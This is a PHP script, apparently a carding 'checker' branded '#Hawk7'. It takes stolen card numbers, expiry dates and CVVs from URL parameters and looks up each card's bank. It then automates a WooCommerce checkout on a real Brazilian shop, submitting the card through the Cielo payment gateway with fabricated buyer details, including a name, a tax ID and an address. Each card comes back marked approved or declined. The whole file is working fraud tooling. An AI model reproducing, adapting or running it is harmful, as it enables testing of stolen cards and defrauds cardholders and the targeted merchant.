<?php

error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Sao_Paulo');

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
    }
function getstr2($string, $start, $end, $i){
    $str = explode($start,$string);
    $str = explode($end,$str[$i]);
    return $str[0];
    }

$bin = substr($cc, 0, 6); 

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$bin");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$apibin = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$bin");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$apibinchk = curl_exec($ch);

$bankname = getstr2($apibin,'"name":"','"', 2);
$bandeira = getStr($apibin,'"scheme":"','"');
$bandeirachk = getStr($apibinchk,'"scheme":"','"');
$tipo = getStr($apibin,'"type":"','"');
$country = getStr($apibin,'"alpha2":"','"');

$bin_result = "$bandeira $bankname $tipo $country";
$bin_result = strtoupper($bin_result);

switch (substr($cc, 0, 1)) {
    case '2':
$bin_result = 'MASTERCARD BANCO INTER GOLD BR';
break;
    }

 switch (substr($cc, 0, 1)) {
case '4':
$typecard2 = 'visaelectron';
break;
case '5':
$typecard2 = 'maestro';
break;
case '2':
$typecard2 = 'maestro';
break;
case '6':
$typecard2 = 'elodebito';
break;
} 

if(!$cc || !$mes || !$ano || !$cvv){
exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [Informe todos os dados!] </span> ➜ #Hawk7 <br>');
}

if(!is_numeric($cc)){
exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [CC Invalida!] </span> ➜ #Hawk7 <br>');
}if(!is_numeric($mes)){
    exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [CC Invalida!] </span> ➜ #Hawk7 <br>');
    }if(!is_numeric($ano)){
        exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [CC Invalida!] </span> ➜ #Hawk7 <br>');
        }if(!is_numeric($cvv)){
            exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [CC Invalida!] </span> ➜ #Hawk7 <br>');
            }
            
if(strlen($cc) !== 16){
exit('<font color="white">#Reprovada ➜ <span class="badge rounded-pill bg-danger"> [CC Invalida!] </span> ➜ #Hawk7 <br>');
}


$rand = rand(1,99999);
$email = "carlosroberto".$rand."@gmail.com";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cerealistamonteverde.com.br/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://cerealistamonteverde.com.br',
'referer: https://cerealistamonteverde.com.br/produto/mix-de-vegetais-chips/?attribute_peso=500g',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4728.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=add_variation_to_cart&product_id=1848&variation_id=1850&variations=%7B%22attribute_peso%22%3A%22500g%22%7D&quantity=1&gift_wrap=');
$addcart = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cerealistamonteverde.com.br/checkout/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'referer: https://cerealistamonteverde.com.br/carrinho/',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4728.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$checkout = curl_exec($ch);

$nonce = getStr($checkout,'name="woocommerce-process-checkout-nonce" value="','"');

$id = getStr($sources,'"id": "','"', 1);
$clientsecret = getStr($sources,'"client_secret": "','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cerealistamonteverde.com.br/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://cerealistamonteverde.com.br',
'referer: https://cerealistamonteverde.com.br/checkout/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4728.0 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=dianq&billing_last_name=silva&billing_persontype=1&billing_cpf=355.981.478-23&billing_rg=287395406&billing_company=&billing_cnpj=&billing_ie=&billing_country=BR&billing_postcode=03517-000&billing_address_1=Rua+Antonieta+de+Morais&billing_number=530&billing_address_2=&billing_neighborhood=Vila+Matilde&billing_city=S%C3%A3o+Paulo&billing_state=SP&billing_phone=(22)+99873-6309&billing_email='.$email.'&createaccount=1&account_password=fodase%40123A&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_postcode=&shipping_address_1=&shipping_number=&shipping_address_2=&shipping_neighborhood=&shipping_city=&shipping_state=SP&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fcerealistamonteverde.com.br%2Fproduto%2Fcastanha-do-para%2F&wc_order_attribution_session_start_time=2024-03-31+20%3A13%3A06&wc_order_attribution_session_pages=23&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F123.0.0.0+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A23&payment_method=jrossetto_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=mastercard&cielo_webservice%5Btitular%5D=DIANA+SILVA&cielo_webservice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade%5D='.$mes.'+%2F+'.$ano.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDY5LjYwfGJXRnpkR1Z5WTJGeVpBPT18TmprdU5qQT18YWQ0MWU5MmUyM2I4MzVlMGM0ZmQ1ZDBjOTQ1ZjNiZGE%3D&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 echo $pagamento = curl_exec($ch);

$INFOCC = "$bandeira $bankname $tipo $country";
$retorno = getStr($pagamento, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n",');

if(strpos($pagamento, '"result":"success","redirect":"') !== false){

    echo "<span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> Aprovada </span> » <span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> $lista </span> ⇝ $INFOCC ⇝ <span style='color: #ffffff;'> 𝗥𝗲𝘁𝗼𝗿𝗻𝗼:</span> <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'>[ 00 - Transação Capturada ]</span> ⇝ <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'> Flexxxxn/span><br>";
}
elseif(strpos($pagamento, 'failure') !== false)

echo "<span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> Reprovada </span> » <span style='background: linear-gradient(90deg, rgba(158,141,66,1) 0%, rgba(255,253,192,1) 100%); color: black;' class='badge bg-gold'> $lista </span> ⇝ $INFOCC⇝ <span style='color: #ffffff;'> 𝗥𝗲𝘁𝗼𝗿𝗻𝗼:</span> <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'> $retorno </span> ⇝ <span style='background: linear-gradient(90deg, rgb(255 239 166) 0%, rgb(121 73 255) 100%); color: black;' class='badge bg-gold'> Flexxxxn/span><br>";

?>